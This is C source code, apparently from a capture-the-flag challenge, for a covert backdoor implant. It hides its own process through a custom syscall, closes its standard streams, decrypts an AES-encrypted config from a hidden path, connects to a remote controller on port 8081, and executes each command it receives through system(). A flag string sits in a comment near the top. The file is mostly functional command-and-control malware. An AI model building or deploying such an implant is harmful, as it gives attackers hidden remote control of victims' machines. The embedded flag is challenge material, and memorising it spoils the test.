#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include "aes.h"
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//#define CONFIG_PATH "config.bin"
#define CONFIG_PATH "/tHVVHY5d/FxGjGjMh"
// CUP{B8ZRAytWjre8AUb0yWFuLJIKAHwlYXys}

#define REVERSE_UINT32(x) (x >> 24) | ((x >> 16 & 0xff) << 8) | ((x >> 8 & 0xff) << 16) | ((x & 0xff) << 24)

typedef struct NetHandlerArgs {
    char* ip;
    char* iv;
    char* key;
} t_NetHndlArgs;


pthread_t* threads[128];

int config_fd;
uint32_t config_size;
uint8_t* config_data;

void setup(void);
int openConfigFile(void);
int parse_and_execute(char*);
void* NetworkHandler(void* argv);
void* CmdHandler(void* argv);
int add_thread_to_list(pthread_t* newThreadId);

int main()
{
    setup();
    // hide process code, works only on Super Secure Linux kernel
    int pid = getpid();
    syscall(78, -1, NULL, pid);
    
    openConfigFile();
    // read and parse config     
    config_data = (uint8_t*) malloc(config_size + 64);
    int nbytes = read(config_fd, config_data, config_size);

    // test magic value
    uint32_t magic = *(uint32_t*)config_data;
    if (magic != 0xddccbbaa)
        exit(1);

    uint32_t entryCnt = REVERSE_UINT32(*(uint32_t*) (config_data+4));
    uint32_t off = 8;

    for (int i = 0; i < entryCnt; i++) {
        uint32_t dataOffset = REVERSE_UINT32(*(uint32_t*)(config_data + off));
        off += sizeof(uint32_t);
        uint32_t dataSize = REVERSE_UINT32(*(uint32_t*)(config_data + off));
        off += sizeof(uint32_t);
        uint32_t dataCrc = REVERSE_UINT32(*(uint32_t*)(config_data + off));
        off += sizeof(uint32_t);

        uint8_t* AES_key = (uint8_t*) malloc(16);
        memcpy(AES_key, config_data + off, 16);
        off += 16;

        uint8_t* data = (uint8_t*) malloc(dataSize);
        memcpy(data, config_data + dataOffset, dataSize);

        struct AES_ctx ctx;
        AES_init_ctx(&ctx, AES_key);
        for (int j = 0; j < (dataSize / 16); j++)
            AES_ECB_decrypt(&ctx, data + j * 16);
        
        parse_and_execute(data);
    }

    for (int i = 0; i < 128; i++) {
        if (threads[i] != 0) {
            pthread_join(*threads[i], NULL);    
            threads[i] = 0;
        }
    }

    close(config_fd);
    return 0;
};

int openConfigFile()
{
    config_fd = open(CONFIG_PATH, 0);

    if (config_fd == -1)
        exit(1);

    struct stat st;
    fstat(config_fd, &st);
    config_size = st.st_size;

    if (config_size < 0)
        exit(1);
};

int parse_and_execute(char* cmd)
{
    char* ptr = strtok(cmd, "|");
    uint8_t command = 0;

    if (!strcmp(ptr, "NET"))
        command = 1;
    if (!strcmp(ptr, "CMD"))
        command = 2;
    if (!strcmp(ptr, "ENC"))
        command = 3;

    switch (command)
    {
        case 1:
        {   
            ptr = strtok(NULL, "|");    
            char* ip = ptr;
            ptr = strtok(NULL, "|");
            char* iv = ptr;
            ptr = strtok(NULL, "|");
            char* key = ptr;

            t_NetHndlArgs* l_args = (t_NetHndlArgs*) malloc(sizeof(t_NetHndlArgs));
            l_args->ip = ip;
            l_args->iv = iv;
            l_args->key = key;
            
            pthread_t* tid = (pthread_t*) malloc(sizeof(pthread_t));
            add_thread_to_list(tid);
            pthread_create(tid, NULL, NetworkHandler, (void*)l_args);
            sleep(2);
            break;
        }
        case 2:
        {
            ptr = strtok(NULL, "|");
            pthread_t* tid = (pthread_t*) malloc(sizeof(pthread_t));
            add_thread_to_list(tid);
            pthread_create(tid, NULL, CmdHandler, (void*)ptr);
            break;
        }
        case 3:
            break;
        default:
            break;
    }    
};

void* NetworkHandler(void* argv)
{
    t_NetHndlArgs* args = (t_NetHndlArgs*) argv;
    // convert IV and key
    uint8_t* iv = (uint8_t*) malloc(strlen(args->iv) / 2);
    uint8_t* key = (uint8_t*) malloc(strlen(args->key) / 2);

    char* ptr = args->iv;
    for (int i = 0; i < strlen(args->iv) / 2; i++) {
        sscanf(ptr, "%2hhx", &iv[i]);
        ptr += 2;
    }

    ptr = args->key;
    for (int i = 0; i < strlen(args->key) / 2; i++) {
        sscanf(ptr, "%2hhx", &key[i]);
        ptr += 2;
    }
    
    // convert IP
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8081);
    inet_pton(AF_INET, args->ip, &(serv_addr.sin_addr));

    // create and connect
    int client_fd = socket(AF_INET, SOCK_STREAM, 0);

    struct timeval timeout;      
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
    
    if (client_fd < 0) {
        pthread_exit(NULL);
    }

    if (setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
                sizeof(timeout)) < 0)
        pthread_exit(NULL);

    if (connect(client_fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
       pthread_exit(NULL);
    }

    // send init connection cmd
    uint8_t* data = (uint8_t*) malloc(16);
    memset(data, 0, 16);
    memcpy(data, "INIT_CONNECTION", 16);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    AES_CBC_encrypt_buffer(&ctx, data, 16);
    int nbytes = send(client_fd, data, 16, 0);

    if (nbytes != 16)
        pthread_exit(NULL);
    
    memset(data, 0, 16);
    free(data);

    // get password from server
    uint8_t* recv_buffer = (uint8_t*) malloc(1024);
    memset(recv_buffer, 0, 1024);

    nbytes = recv(client_fd, recv_buffer, 1024, 0);

    if (nbytes < 0)
        pthread_exit(NULL);

    if (nbytes % 16 != 0)
        pthread_exit(NULL);

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, recv_buffer, nbytes);

    // check correct passsword
    char* password = (char*) malloc(strlen(recv_buffer));
    memcpy(password, recv_buffer, strlen(recv_buffer));

    // CHANGE THIS TO CHECK IN KERNEL MODE WITH SYSCALL
    int result = syscall(21, password, -1);

    if (!result) {
        close(client_fd);
        pthread_exit(NULL);
    }

    // send correct password packet
    data = (uint8_t*) malloc(16);
    memset(data, 0, 16);
    memcpy(data, "INIT_SUCCEED", 12);

    AES_init_ctx_iv(&ctx, key, iv);

    AES_CBC_encrypt_buffer(&ctx, data, 16);
    nbytes = send(client_fd, data, 16, 0);

    if (nbytes != 16)
        pthread_exit(NULL);
    
    memset(data, 0, 16);
    free(data);

    timeout.tv_sec = 25;
    timeout.tv_usec = 0;

    if (setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
                sizeof(timeout)) < 0)
        pthread_exit(NULL);

    while (1) {
        nbytes = recv(client_fd, recv_buffer, 1024, 0);

        if (nbytes == 0)
            continue;
        if (nbytes < 0)
            continue;

        if (nbytes % 16 != 0)
            pthread_exit(NULL);

        AES_init_ctx_iv(&ctx, key, iv);
        AES_CBC_decrypt_buffer(&ctx, recv_buffer, nbytes);
        //printf("recv_buffer = %s\n", recv_buffer);
        if (strstr(recv_buffer, "EXIT") != NULL)
            pthread_exit(NULL);

        parse_and_execute(recv_buffer);
    }
    
    pthread_exit(NULL);
}

void* CmdHandler(void* argv)
{
    char* command = (char*) argv;
    system(command);
    pthread_exit(NULL);
};

void setup(void)
{
    close(0);
    close(1);
    close(2);
    
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
};

int add_thread_to_list(pthread_t* newThreadId)
{
    for (int i = 0; i < 128; i++) {
        if (threads[i] == 0) {
            threads[i] = newThreadId;
            return 1;
        }
    }
    return 0;
}